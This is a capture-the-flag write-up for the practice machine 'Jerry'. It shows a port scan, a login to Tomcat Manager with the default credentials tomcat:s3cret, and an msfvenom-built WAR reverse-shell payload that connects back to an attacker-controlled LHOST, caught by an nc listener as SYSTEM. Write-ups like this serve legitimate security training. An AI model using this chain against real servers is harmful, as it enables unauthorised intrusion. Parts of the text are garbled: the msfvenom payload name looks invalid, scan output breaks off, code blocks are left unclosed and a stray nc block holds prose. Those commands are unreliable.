# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.95 jerry.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a jerry.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.

# Enumeration

## Port 8080 `Apache Tomcat/Coyote JSP engine 1.1`

![](/assets/images/jerry1.png)

We are presented with the `Apache Tomcat`'s interface. When we clicked on `Manager App`, we are prompted for credentials.

![](/assets/images/jerry2.png)

I tried the default credentials `tomcat:s3cret` and it logged us in!

# Exploitation

Since we have access to the `Manager App` page, this means we can upload a malicious `.WAR` file which I will be generating with `msfvenom`.

```bash
$ msfvenom -a x64 -p java/jsp_reverse_bind_tcp LHOST=10.10.XX.XX LPORT=1337 -f war > shell.war
Payload size: 1118 bytes
Final size of war file: 1118 bytes
```

![](/assets/images/jerry4.png)

After it is uploaded, we see that the `.WAR` file we uploaded has been deployed at `/shell`.

![](/assets/images/jerry5.png)

Now, we setup our `nc` listener.

```bash
$ rlwrap nc -lvnp 1337                                                             
listening on [any] 1337 ...
```

And browse to `/shell`. We will see that on our listener, we get a shell as `SYSTEM`!

```
$ nc -v jerry.htb 80

Both flags are stored as a file called `2 for the price of 1.txt`, available in a folder called `flags` on the `Administrator`'s Desktop.

```
